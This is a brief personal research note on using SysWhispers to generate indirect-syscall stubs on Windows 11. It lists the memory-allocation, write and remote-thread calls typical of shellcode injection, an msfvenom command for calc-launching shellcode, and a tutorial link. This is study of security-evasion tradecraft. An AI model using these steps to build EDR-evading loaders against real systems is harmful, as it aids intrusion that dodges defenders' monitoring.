# 12 - Using SysWhisper for indirrect syscalls
This is my own research and experimentation using SysWhisper to perform a indirect syscall on Windows 11.

To create the files in SysWhisper:
`python syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -a x64 -l masm --out-file syscalls`

To generate shellcode:
`msfvenom -a x64 --platform windows -p windows/x64/exec CMD="calc" -f c -v shellcode`

SysWhisper tutorial on Windows 10:
- https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low